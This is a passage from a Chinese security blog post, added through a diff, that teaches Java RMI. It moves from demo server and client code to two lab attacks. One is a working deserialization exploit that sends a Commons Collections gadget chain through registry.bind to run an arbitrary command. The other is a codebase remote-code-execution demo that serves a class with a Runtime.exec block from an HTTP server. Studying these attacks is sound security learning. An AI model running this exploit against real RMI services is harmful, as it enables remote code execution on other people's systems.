+<li><code>RMI服务端</code>的<code>远程引用层(sun.rmi.server.UnicastServerRef)</code>收到请求会请求传递给<code>Skeleton(sun.rmi.registry.RegistryImpl_Skel#dispatch)</code>。</li>
+<li><code>Skeleton</code>调用<code>RemoteCall</code>反序列化<code>RMI客户端</code>传过来的序列化。</li>
+<li><code>Skeleton</code>处理客户端请求：<code>bind</code>、<code>list</code>、<code>lookup</code>、<code>rebind</code>、<code>unbind</code>，如果是<code>lookup</code>则查找<code>RMI服务名</code>绑定的接口对象，序列化该对象并通过<code>RemoteCall</code>传输到客户端。</li>
+<li><code>RMI客户端</code>反序列化服务端结果，获取远程对象的引用。</li>
+<li><code>RMI客户端</code>调用远程方法，<code>RMI服务端</code>反射调用<code>RMI服务实现类</code>的对应方法并序列化执行结果返回给客户端。</li>
+<li><code>RMI客户端</code>反序列化<code>RMI</code>远程方法调用结果。</li>
+</ol>
+<h2 id="rmi远程方法调用demo">RMI远程方法调用Demo</h2>
+<p>第一步我们需要先启动<code>RMI服务端</code>，并注册服务。</p>
+<p>⼀个RMI Server分为三部分：</p>
+<ol>
+<li>⼀个继承了 java.rmi.Remote 的接⼝，其中定义我们要远程调⽤的函数</li>
+<li>⼀个实现了此接⼝的类</li>
+<li>⼀个主类，⽤来创建Registry，并将上⾯的类实例化后绑定到⼀个地址。这就是我们所谓的Server 了。</li>
+</ol>
+<p>先实现一个继承了 java.rmi.Remote 的接⼝,定要test函数</p>
+<pre><code class="language-java">package com.sec.rmi;
+
+import java.rmi.Remote;
+import java.rmi.RemoteException;
+
+/**
+ * RMI测试接口
+ */
+public interface RMIInterfaceDemo extends Remote {
+
+    /**
+     * RMI测试方法
+     *
+     * @return 返回测试字符串
+     */
+    String test() throws RemoteException;
+
+}
+</code></pre>
+<p>在实现⼀个实现了此接⼝的类 ,并重写了test函数</p>
+<pre><code class="language-java">package com.sec.rmi;
+
+import java.rmi.RemoteException;
+import java.rmi.server.UnicastRemoteObject;
+
+public class RMIImplDemo extends UnicastRemoteObject implements RMIInterfaceDemo {
+
+    private static final long serialVersionUID = 1L;
+
+    protected RMIImplDemo() throws RemoteException {
+        super();
+    }
+
+    /**
+     * RMI测试方法
+     *
+     * @return 返回测试字符串
+     */
+    @Override
+    public String test() throws RemoteException {
+        return &quot;Hello 6right~&quot;;
+    }
+
+}
+</code></pre>
+<p>最后是<strong>RMI服务端注册服务代码：</strong></p>
+<p>Java RMI 设计了一个 Registry 的思想，很好理解，我们可以使用注册表来查找一个远端对象的引用，更通俗的来讲，这个就是一个 RMI 电话本，我们想在某个人那里获取信息时（Remote Method Invocation），我们在电话本上（Registry）通过这个人的名称 （Name）来找到这个人的电话号码（Reference），并通过这个号码找到这个人（Remote Object）</p>
+<pre><code class="language-java">package com.sec.rmi;
+import java.rmi.Naming;
+import java.rmi.registry.LocateRegistry;
+
+
+public class RMIServerDemo {
+    // RMI服务器IP地址
+    public static final String RMI_HOST = &quot;127.0.0.1&quot;;
+    // RMI服务端口
+    public static final int RMI_PORT = 9527;
+    public static final String RMI_NAME = &quot;rmi://&quot; + RMI_HOST + &quot;:&quot; + RMI_PORT + &quot;/test&quot;;
+
+
+    public static void main(String[] args) throws Exception {
+        //新建一个RMI Registry的时候，直接绑定RMIImplDemo对象在上面
+        LocateRegistry.createRegistry(RMI_PORT);
+        //Naming.bind 的第一个参数是一个URL，形如： rmi://host:port/name 。其中，host和port就是RMI Registry的地址和端口，name是远程对象的名字。如果RMI Registry在本地运行，那么host和port是可以省略的，此时host默认是 localhost ，port默认
+是 1099 ：
+        Naming.bind(RMI_NAME, new RMIImplDemo());
+        System.out.println(&quot;RMI服务启动成功,服务地址:&quot; + RMI_NAME);
+    }
+}
+</code></pre>
+<p>程序运行结果：</p>
+<pre><code>RMI服务启动成功,服务地址:rmi://127.0.0.1:9527/test
+</code></pre>
+<p><code>Naming.bind(RMI_NAME, new RMITestImpl())</code>绑定的是服务端的一个类实例，<code>RMI客户端</code>需要有这个实例的接口代码(<code>RMITestInterface.java</code>)，<code>RMI客户端</code>调用服务器端的<code>RMI服务</code>时会返回这个服务所绑定的对象引用，<code>RMI客户端</code>可以通过该引用对象调用远程的服务实现类的方法并获取方法执行结果。</p>
+<p><strong>RMI客户端示例代码：</strong></p>
+<pre><code class="language-java">package com.sec.rmi;
+
+import java.rmi.Naming;
+
+import static com.sec.rmi.RMIServerDemo.RMI_NAME;
+
+public class RMIClientDemo {
+
+    public static void main(String[] args) {
+        try {
+            // 查找远程RMI服务
+            RMIInterfaceDemo rt = (RMIInterfaceDemo) Naming.lookup(RMI_NAME);
+            // 调用远程接口RMITestInterface类的test方法
+            String result = rt.test();
+            // 输出RMI方法调用结果
+            System.out.println(result);
+        } catch (Exception e) {
+            e.printStackTrace();
+        }
+    }
+}
+</code></pre>
+<p>客户端就简单多了，使⽤ Naming.lookup 在Registry中寻找到名字是Hello的对象，后⾯的使⽤就和在 本地使⽤⼀样了。</p>
+<p>虽说执⾏远程⽅法的时候代码是在远程服务器上执⾏的，但实际上我们还是需要知道有哪些⽅法，这时 候接⼝的重要性就体现了，这也是为什么我们前⾯要继承 Remote 并将我们需要调⽤的⽅法写在接⼝ RMIInterfaceDemo⾥，因为客户端也需要⽤到这个接⼝。</p>
+<p>程序运行结果：</p>
+<figure data-type="image" tabindex="2"><img src="https://img-blog.csdnimg.cn/img_convert/f0e5a073e01e8a1307319db39da44a4f.png" alt="image-20220321142134618" loading="lazy"></figure>
+<p>上面的Demo是在本地下实现的，现在在两台主机上进行C/S的流程</p>
+<p>服务端还是刚刚的本地服务端，客户端改部署在kali上</p>
+<p>kali-ip：192.168.159.132</p>
+<p>本机ip：192.168.159.1</p>
+<p>kali上RMIClientDemo.java</p>
+<pre><code class="language-java">package com.sec.rmi;
+
+import java.rmi.Naming;
+
+
+public class RMIClientDemo {
+    public static final String RMI_HOST = &quot;192.168.159.1&quot;;
+    public static final int RMI_PORT = 9527;
+    public static final String RMI_NAME = &quot;rmi://&quot; + RMI_HOST + &quot;:&quot; + RMI_PORT + &quot;/test&quot;;
+    public static void main(String[] args) {
+        try {
+            // 查找远程RMI服务
+            RMIInterfaceDemo rt = (RMIInterfaceDemo) Naming.lookup(RMI_NAME);
+            // 调用远程接口RMITestInterface类的test方法
+            String result = rt.test();
+            // 输出RMI方法调用结果
+            System.out.println(result);
+        } catch (Exception e) {
+            e.printStackTrace();
+        }
+    }
+}
+
+</code></pre>
+<p>还需要实现接口RMIInterfaceDemo.java</p>
+<pre><code class="language-java">package com.sec.rmi;
+
+import java.rmi.Remote;
+import java.rmi.RemoteException;
+
+/**
+ * RMI测试接口
+ */
+public interface RMIInterfaceDemo extends Remote {
+
+    /**
+     * RMI测试方法
+     *
+     * @return 返回测试字符串
+     */
+    String test() throws RemoteException;
+}
+</code></pre>
+<figure data-type="image" tabindex="3"><img src="https://img-blog.csdnimg.cn/img_convert/e6d919f8be65745f889955553265d558.png" alt="image-20220321153429032" loading="lazy"></figure>
+<p>tips：</p>
+<ul>
+<li>服务端的包名就是最开始的<code>package com.sec.rmi;</code>，客户端包名也要一样不然会报错</li>
+</ul>
+<p>RMI Registry就像⼀个⽹关，他⾃⼰是不会执⾏远程⽅法的，但RMI Server可以在上⾯注册⼀个Name 到对象的绑定关系；RMI Client通过Name向RMI Registry查询，得到这个绑定关系，然后再连接RMI Server；最后，远程⽅法实际上在RMI Server上调⽤。</p>
+<h2 id="rmi客户端攻击服务端">RMI客户端攻击服务端</h2>
+<p>RMI攻击围绕着三个主体</p>
+<ul>
+<li>Server端</li>
+<li>Client端</li>
+<li>Registry端</li>
+</ul>
+<p>最常见的就是在Client端攻击Server端，所以接下来的分析都是如此</p>
+<h3 id="rmi反序列化漏洞">RMI反序列化漏洞</h3>
+<p><code>RMI</code>通信中所有的对象都是通过Java序列化传输的，只要有Java对象反序列化操作就有可能有漏洞。</p>
+<p>既然<code>RMI</code>使用了反序列化机制来传输<code>Remote</code>对象，那么可以通过构建一个恶意的<code>Remote</code>对象，这个对象经过序列化后传输到服务器端，服务器端在反序列化时候就会触发反序列化漏洞。</p>
+<p>首先我们依旧使用上述<code>com.sec.rmi.RMIServerDemo</code>的代码，创建一个<code>RMI</code>服务，然后我们来构建一个恶意的<code>Remote</code>对象并通过<code>bind</code>请求发送给服务端。</p>
+<p><strong>RMI客户端反序列化攻击示例代码：</strong></p>
+<p>tips:</p>
+<ul>
+<li>这里使用的是CC链，jdk版本下调至1.7才可以复现RCE</li>
+</ul>
+<pre><code class="language-java">package com.sec.rmi;
+
+import org.apache.commons.collections.Transformer;
+import org.apache.commons.collections.functors.ChainedTransformer;
+import org.apache.commons.collections.functors.ConstantTransformer;
+import org.apache.commons.collections.functors.InvokerTransformer;
+import org.apache.commons.collections.map.LazyMap;
+
+import javax.net.ssl.SSLContext;
+import javax.net.ssl.SSLSocketFactory;
+import javax.net.ssl.TrustManager;
+import javax.net.ssl.X509TrustManager;
+import java.io.IOException;
+import java.lang.reflect.Constructor;
+import java.lang.reflect.InvocationHandler;
+import java.lang.reflect.Proxy;
+import java.net.Socket;
+import java.rmi.ConnectIOException;
+import java.rmi.Remote;
+import java.rmi.registry.LocateRegistry;
+import java.rmi.registry.Registry;
+import java.rmi.server.RMIClientSocketFactory;
+import java.security.cert.X509Certificate;
+import java.util.HashMap;
+import java.util.Map;
+
+import static com.sec.rmi.RMIServerDemo.RMI_HOST;
+import static com.sec.rmi.RMIServerDemo.RMI_PORT;
+
+/**
+ * RMI反序列化漏洞利用，修改自ysoserial的RMIRegistryExploit：https://github.com/frohoff/ysoserial/blob/master/src/main/java/ysoserial/exploit/RMIRegistryExploit.java
+ *
+ * @author yz
+ */
+public class RMIExploit {
+
+    // 定义AnnotationInvocationHandler类常量
+    public static final String ANN_INV_HANDLER_CLASS = &quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;;
+
+    /**
+     * 信任SSL证书
+     */
+    private static class TrustAllSSL implements X509TrustManager {
+
+        private static final X509Certificate[] ANY_CA = {};
+
+        public X509Certificate[] getAcceptedIssuers() {
+            return ANY_CA;
+        }
+
+        public void checkServerTrusted(final X509Certificate[] c, final String t) { /* Do nothing/accept all */ }
+
+        public void checkClientTrusted(final X509Certificate[] c, final String t) { /* Do nothing/accept all */ }
+
+    }
+
+    /**
+     * 创建支持SSL的RMI客户端
+     */
+    private static class RMISSLClientSocketFactory implements RMIClientSocketFactory {
+
+        public Socket createSocket(String host, int port) throws IOException {
+            try {
+                // 获取SSLContext对象
+                SSLContext ctx = SSLContext.getInstance(&quot;TLS&quot;);
+
+                // 默认信任服务器端SSL
+                ctx.init(null, new TrustManager[]{new TrustAllSSL()}, null);
+
+                // 获取SSL Socket连接工厂
+                SSLSocketFactory factory = ctx.getSocketFactory();
+
+                // 创建SSL连接
+                return factory.createSocket(host, port);
+            } catch (Exception e) {
+                throw new IOException(e);
+            }
+        }
+    }
+
+    /**
+     * 使用动态代理生成基于InvokerTransformer/LazyMap的Payload
+     *
+     * @param command 定义需要执行的CMD
+     * @return Payload
+     * @throws Exception 生成Payload异常
+     */
+    private static InvocationHandler genPayload(String command) throws Exception {
+        // 创建Runtime.getRuntime.exec(cmd)调用链
+        Transformer[] transformers = new Transformer[]{
+                new ConstantTransformer(Runtime.class),
+                new InvokerTransformer(&quot;getMethod&quot;, new Class[]{
+                        String.class, Class[].class}, new Object[]{
+                        &quot;getRuntime&quot;, new Class[0]}
+                ),
+                new InvokerTransformer(&quot;invoke&quot;, new Class[]{
+                        Object.class, Object[].class}, new Object[]{
+                        null, new Object[0]}
+                ),
+                new InvokerTransformer(&quot;exec&quot;, new Class[]{String.class}, new Object[]{command})
+        };
+
+        // 创建ChainedTransformer调用链对象
+        Transformer transformerChain = new ChainedTransformer(transformers);
+
+        // 使用LazyMap创建一个含有恶意调用链的Transformer类的Map对象
+        final Map lazyMap = LazyMap.decorate(new HashMap(), transformerChain);
+
+        // 获取AnnotationInvocationHandler类对象
+        Class clazz = Class.forName(ANN_INV_HANDLER_CLASS);
+
+        // 获取AnnotationInvocationHandler类的构造方法
+        Constructor constructor = clazz.getDeclaredConstructor(Class.class, Map.class);
+
+        // 设置构造方法的访问权限
+        constructor.setAccessible(true);
+
+        // 实例化AnnotationInvocationHandler，
+        // 等价于: InvocationHandler annHandler = new AnnotationInvocationHandler(Override.class, lazyMap);
+        InvocationHandler annHandler = (InvocationHandler) constructor.newInstance(Override.class, lazyMap);
+
+        // 使用动态代理创建出Map类型的Payload
+        final Map mapProxy2 = (Map) Proxy.newProxyInstance(
+                ClassLoader.getSystemClassLoader(), new Class[]{Map.class}, annHandler
+        );
+
+        // 实例化AnnotationInvocationHandler，
+        // 等价于: InvocationHandler annHandler = new AnnotationInvocationHandler(Override.class, mapProxy2);
+        return (InvocationHandler) constructor.newInstance(Override.class, mapProxy2);
+    }
+
+    /**
+     * 执行Payload
+     *
+     * @param registry RMI Registry
+     * @param command  需要执行的命令
+     * @throws Exception Payload执行异常
+     */
+    public static void exploit(final Registry registry, final String command) throws Exception {
+        // 生成Payload动态代理对象
+        Object payload = genPayload(command);
+        String name    = &quot;test&quot; + System.nanoTime();
+
+        // 创建一个含有Payload的恶意map
+        Map&lt;String, Object&gt; map = new HashMap();
+        map.put(name, payload);
+
+        // 获取AnnotationInvocationHandler类对象
+        Class clazz = Class.forName(ANN_INV_HANDLER_CLASS);
+
+        // 获取AnnotationInvocationHandler类的构造方法
+        Constructor constructor = clazz.getDeclaredConstructor(Class.class, Map.class);
+
+        // 设置构造方法的访问权限
+        constructor.setAccessible(true);
+
+        // 实例化AnnotationInvocationHandler，
+        // 等价于: InvocationHandler annHandler = new AnnotationInvocationHandler(Override.class, map);
+        InvocationHandler annHandler = (InvocationHandler) constructor.newInstance(Override.class, map);
+
+        // 使用动态代理创建出Remote类型的Payload
+        Remote remote = (Remote) Proxy.newProxyInstance(
+                ClassLoader.getSystemClassLoader(), new Class[]{Remote.class}, annHandler
+        );
+
+        try {
+            // 发送Payload
+            registry.bind(name, remote);
+        } catch (Throwable e) {
+            e.printStackTrace();
+        }
+    }
+
+    public static void main(String[] args) throws Exception {
+        if (args.length == 0) {
+            // 如果不指定连接参数默认连接本地RMI服务
+            args = new String[]{RMI_HOST, String.valueOf(RMI_PORT), &quot;calc&quot;};
+        }
+
+        // 远程RMI服务IP
+        final String host = args[0];
+
+        // 远程RMI服务端口
+        final int port = Integer.parseInt(args[1]);
+
+        // 需要执行的系统命令
+        final String command = args[2];
+
+        // 获取远程Registry对象的引用
+        Registry registry = LocateRegistry.getRegistry(host, port);
+
+        try {
+            // 获取RMI服务注册列表(主要是为了测试RMI连接是否正常)
+            String[] regs = registry.list();
+
+            for (String reg : regs) {
+                System.out.println(&quot;RMI:&quot; + reg);
+            }
+        } catch (ConnectIOException ex) {
+            // 如果连接异常尝试使用SSL建立SSL连接,忽略证书信任错误，默认信任SSL证书
+            registry = LocateRegistry.getRegistry(host, port, new RMISSLClientSocketFactory());
+        }
+
+        // 执行payload
+        exploit(registry, command);
+    }
+
+}
+</code></pre>
+<p>程序执行后将会在<code>RMI服务端</code>弹出计算器，<code>RMIExploit</code>程序执行的流程大致如下：</p>
+<ol>
+<li>使用<code>LocateRegistry.getRegistry(host, port)</code>创建一个<code>RemoteStub</code>对象。</li>
+<li>构建一个适用于<code>Apache Commons Collections</code>的恶意反序列化对象(使用的是<code>LazyMap</code>+<code>AnnotationInvocationHandler</code>组合方式)。</li>
+<li>使用<code>RemoteStub</code>调用<code>RMI服务端</code>的<code>bind</code>指令，并传入一个使用动态代理创建出来的<code>Remote</code>类型的恶意<code>AnnotationInvocationHandler</code>对象到<code>RMI服务端</code>。</li>
+<li><code>RMI服务端</code>接受到<code>bind</code>请求后会反序列化我们构建的恶意<code>Remote对象</code>从而触发<code>Commons Collections</code>漏洞的<code>RCE</code>。</li>
+</ol>
+<h3 id="codebase远程代码执行">codebase远程代码执行</h3>
+<h4 id="codebase">Codebase</h4>
+<p>codebase是一个地址，告诉Java虚拟机我们应该从哪个地方去搜索类,而CLASSPATH是“本地codebase”，它是磁盘上加载本地类的位置。</p>
+<ul>
+<li>
+<p>codebase通常是远程URL，比如http、ftp等。</p>
+</li>
+<li>
+<p>例如指定 codebase=http://example.com/ ，然后加载 com.sec.Codebase.Example 类，则 Java虚拟机会下载这个文件 http://example.com/com.sec.Codebase.Example，并作为 Example类的字节码。</p>
+</li>
+</ul>
+<p>RMI的流程中，客户端和服务端之间传递的是一些序列化后的对象，这些对象在反序列化时，就会去寻找类。如果某一端反序列化时发现一个对象，那么就会去自己的CLASSPATH下寻找想对应的类；如果在 本地没有找到这个类，就会去远程加载codebase中的类。</p>
+<ul>
+<li>例如RMIClientDemo.java 编译之后会生成RMIClientDemo.class 和 RMIClientDemo$Right6.class，我们的服务端会访问这两个文件</li>
+</ul>
+<p>在RMI中，我们是可以将codebase随着序列化数据一起传输的，服务器在接收到这个数据后在 CLASSPATH没有找到，就会去指定的codebase寻找类，往RMIClient.java中添加恶意命令执行的代码，由于codebase被控制导致任意命令执行漏洞。</p>
+<p>只有满足如下条件的RMI服务器才能被攻击：</p>
+<ul>
+<li>
+<p>需要SecurityManager</p>
+<ul>
+<li>因为我们通过网络加载外部类并执行方法，所以我们必须要有一个安全管理器来进行管理，如果没有设置安全管理，则 RMI 不会动态加载任何类</li>
+</ul>
+</li>
+<li>
+<p>Java版本低于7u21、6u45，或者设置了 java.rmi.server.useCodebaseOnly=false</p>
+<ul>
+<li>官方在Java 7u21、6u45的时候将 java.rmi.server.useCodebaseOnly 的默认值由 false 改为了 true 。</li>
+<li>在 java.rmi.server.useCodebaseOnly 配置为 true 的情况下，Java虚拟机将只信任预先配置好的 codebase ，不再支持从RMI请求中获取。</li>
+</ul>
+</li>
+</ul>
+<figure data-type="image" tabindex="4"><img src="https://img-blog.csdnimg.cn/img_convert/4c3586150244b784e5f2bea5c44b821a.png" alt="image-20220321195352922" loading="lazy"></figure>
+<h4 id="复现demo">复现Demo</h4>
+<p>我们来编写一个简单的RMIServer用于复现这个漏洞。</p>
+<p>注意jdk环境要低于7u21、6u45，这里我使用JDK 1.7.0_17</p>
+<h5 id="客户端">客户端</h5>
+<ul>
+<li>kali：192.168.159.132</li>
+<li>RMIClientDemo.java</li>
+</ul>
+<pre><code class="language-java">package com.sec.rmi;
+
+import java.io.Serializable;
+import java.rmi.Naming;
+import java.util.ArrayList;
+import java.util.List;
+
+public class RMIClientDemo implements Serializable {
+    public static final String RMI_HOST = &quot;192.168.159.1&quot;;
+    public static final int RMI_PORT = 9527;
+    public static final String RMI_NAME = &quot;rmi://&quot; + RMI_HOST + &quot;:&quot; + RMI_PORT + &quot;/test&quot;;
+    public class Right6 extends ArrayList&lt;Integer&gt; {}
+    public void lookup() throws Exception {
+	    List&lt;Integer&gt; li = new Right6();
+   		RMIInterfaceDemo rt = (RMIInterfaceDemo) Naming.lookup(RMI_NAME);
+        String result = rt.test(li);//远程调用触发点，在这里触发从cosebase中读取class文件执行！！
+        System.out.println(result);
+    }
+    public static void main(String[] args) {
+        try {
+            new RMIClientDemo().lookup();
+        } catch (Exception e) {
+            e.printStackTrace();
+        }
+    }
+}
+
+</code></pre>
+<p>本地只有一个抽象接口，所以Right6具体是从cosebase获取的class文件</p>
+<ul>
+<li>RMIInterfaceDemo.java</li>
+</ul>
+<pre><code class="language-java">package com.sec.rmi;
+
+import java.rmi.Remote;
+import java.rmi.RemoteException;
+import java.util.List;
+
+/**
+ * RMI测试接口
+ */
+public interface RMIInterfaceDemo extends Remote {
+
+    /**
+     * RMI测试方法
+     *
+     * @return 返回测试字符串
+     */
+    String test(List&lt;Integer&gt; params) throws RemoteException;
+
+}
+</code></pre>
+<h5 id="服务端">服务端</h5>
+<ul>
+<li>windows：192.168.159.1</li>
+<li>RMIImplDemo.java</li>
+</ul>
+<pre><code class="language-java">package com.sec.rmi;
+
+import java.util.List;
+import java.rmi.RemoteException;
+import java.rmi.server.UnicastRemoteObject;
+
+public class RMIImplDemo extends UnicastRemoteObject implements RMIInterfaceDemo {
+
+    private static final long serialVersionUID = 1L;
+
+    protected RMIImplDemo() throws RemoteException {
+        super();
+    }
+
+    /**
+     * RMI测试方法
+     *
+     * @return 返回测试字符串
+     */
+    @Override
+    public String test(List&lt;Integer&gt; params) throws RemoteException {
+        return &quot;Hello 6right~&quot;;
+    }
+
+}
+</code></pre>
+<ul>
+<li>RMlInterfaceDemo.java</li>
+</ul>
+<p>和客户端的一致</p>
+<ul>
+<li>RMIServerDemo.java</li>
+</ul>
+<pre><code class="language-java">package com.sec.rmi;
+import java.rmi.Naming;
+import java.rmi.registry.LocateRegistry;
+
+
+public class RMIServerDemo {
+    public static final String RMI_HOST = &quot;192.168.159.1&quot;;
+    public static final int RMI_PORT = 9527;
+    public static final String RMI_NAME = &quot;rmi://&quot; + RMI_HOST + &quot;:&quot; + RMI_PORT + &quot;/test&quot;;
+
+
+    public static void main(String[] args) throws Exception {
+        //设置安全策略
+        if (System.getSecurityManager() == null) {
+            System.out.println(&quot;setup SecurityManager&quot;);
+            System.setSecurityManager(new SecurityManager());
+        }
+        LocateRegistry.createRegistry(RMI_PORT);
+        Naming.bind(RMI_NAME, new RMIImplDemo());
+        System.out.println(&quot;RMI服务启动成功,服务地址:&quot; + RMI_NAME);
+    }
+}
+</code></pre>
+<ul>
+<li>1.policy
+<ul>
+<li>开放所有权限</li>
+</ul>
+</li>
+</ul>
+<pre><code>grant {
+    permission java.security.AllPermission;
+};
+</code></pre>
+<p>tips:policy文件放在工作目录下,服务端传参调用-Djava.security.policy=1.policy</p>
+<figure data-type="image" tabindex="5"><img src="https://img-blog.csdnimg.cn/img_convert/01752f3a2f81076a3cbbe8c3e3e8aca0.png" alt="image-20220322100820229" loading="lazy"></figure>
+<p>客户端调用</p>
+<pre><code>java  -Djava.rmi.server.codebase=http://x.x.x.x:x/ com.sec.rmi.RMIClientDemo
+</code></pre>
+<p>vps成功收到请求</p>
+<figure data-type="image" tabindex="6"><img src="https://img-blog.csdnimg.cn/img_convert/09848e3191f6f83b5aeca132c28bdf19.png" alt="image-20220322100925661" loading="lazy"></figure>
+<p>接下来直接利用，将RMIClientDemo加入恶意代码</p>
+<pre><code class="language-java">package com.sec.rmi;
+
+import java.io.Serializable;
+import java.rmi.Naming;
+import java.util.ArrayList;
+import java.util.List;
+
+public class RMIClientDemo implements Serializable {
+    private static final long serialVersionUID = 1L;
+    static {
+        try{
+            Runtime.getRuntime().exec(&quot;calc&quot;);
+        } catch (Exception e){
+            e.printStackTrace();
+        }
+    }
+    public static final String RMI_HOST = &quot;192.168.159.1&quot;;
+    public static final int RMI_PORT = 9527;
+    public static final String RMI_NAME = &quot;rmi://&quot; + RMI_HOST + &quot;:&quot; + RMI_PORT + &quot;/test&quot;;
+    public class Right6 extends ArrayList&lt;Integer&gt; {}
+    public void lookup() throws Exception {
+        List&lt;Integer&gt; li = new Right6();
+        RMIInterfaceDemo rt = (RMIInterfaceDemo) Naming.lookup(RMI_NAME);
+        String result = rt.test(li);//远程调用触发点，在这里触发从cosebase中读取class文件执行！！
+        System.out.println(result);
+    }
+    public static void main(String[] args) {
+        try {
+            new RMIClientDemo().lookup();
+        } catch (Exception e) {
+            e.printStackTrace();
+        }
+    }
+}
+
+</code></pre>
+<p>开启httpserver</p>
+<pre><code>python -m SimpleHTTPServer 8000 
+</code></pre>
+<p>客户端重新发起恶意请求，服务端成功执行</p>
+<figure data-type="image" tabindex="7"><img src="https://img-blog.csdnimg.cn/img_convert/d2441943e22d398967e5bc0cd013c595.png" alt="image-20220322104454301" loading="lazy"></figure>
+<h4 id="简单流程">简单流程</h4>
+<p>客户端在调用时，传递了一个可序列化对象，这个对象在服务端不存在，则在服务端会抛出 ClassNotFound 的异常，但是 RMI 支持动态类加载，如果设置了 <code>java.rmi.server.codebase</code>，则会尝试从其中的地址获取 <code>.class</code> 并加载及反序列化。当其中包含恶意代码片段时执行达到远程RCE</p>
+<h2 id="总结">总结</h2>
+<p>简单学习了 RMI的基础知识 ，通过Demo了解了RMI 的使用，分析了 RMI 实现的部分流程，针对 RMI 中Clinet端攻击Server端进行了Demo测试。</p>
+<p>其实剩下来的知识点还很多，后面写的话还会更一篇文章。</p>
+<ul>
+<li>JEP290学习及绕过</li>
+<li>RMI利用JRMP协议漏洞</li>
+<li>Server攻击Client端(反制)</li>
+<li>Registry端的攻击</li>
+</ul>
+<h2 id="参考">参考</h2>
+<ul>
+<li>https://javasec.org/javase/RMI/</li>
+<li>https://su18.org/post/rmi-attack/</li>
+<li>p牛java漫谈</li>
+</ul>
+]]></content>
+    </entry>
+</feed>
